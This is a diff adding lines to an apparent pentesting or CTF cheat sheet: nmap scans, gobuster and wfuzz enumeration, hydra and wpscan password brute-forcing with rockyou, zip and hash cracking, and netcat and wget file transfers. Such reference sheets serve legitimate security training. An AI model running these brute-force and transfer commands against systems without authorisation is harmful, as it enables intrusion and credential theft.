@@ -3,6 +3,8 @@ curl <server-ip>
 
 # Network Mapper to find open ports and services
 nmap <server-ip>
+nmap -vv -sC -sV -oN nmap.log $IP # Basic scan
+nmap -vv -A -p- -oN nmap-complete.log $IP # Complete nmap scan
 
 # SSH to server
 ssh username@server
@@ -10,8 +12,49 @@ ssh username@server
 # SSH with stolen private key
 ssh -i my_private_key.pem user@hostname
 
+# WEB:
+
 # gobuster for directory enum
 gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log -t 200 -u $URL
+
+# Wfuzz
+wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/?parameter=FUZZ # Brute force query params
+wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 --hc 404 http://www.host.name/FUZZ
+wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 200 --hc 404 -R $DEPTH http://www.host.name/FUZZ # Recursive directory scanning
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>" # Hydra
+wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames usernames.txt # Wordpress Scanner
+wfuzz -c -f wfuzz-sub.log -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $URL -H "Host: FUZZ.host.name" -t 32 --hc 200 --hw 356
+gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL -t 32
+
+# CRACKING
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
+hashcat -m $MODE hashes /usr/share/wordlists/rockyou.txt
+
+# Brute-Force SSH
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+
+# Steganography
+pip3 install stegcracker
+python3 -m stegcracker tocrack.jpg
+
+# Transferring Files
+python3 -m http.server -b $IP $PORT
+php -S $IP:$PORT
+wget http://$IP:$PORT/file
+curl http://$IP:$PORT/file -o target_file
+nc $IP $PORT > target_file
+
+scp /path/to/file user@$HOST:/path/
+scp /path/to/file user@$HOST:/path/different_name
+scp user@$HOST:/path/to/file /local/directory
+
+# Server
+nc -lp $PORT < file
+# Client
+nc $IP $PORT > file
+
 
 # Search recurively through directories finding any character match
 grep -R .
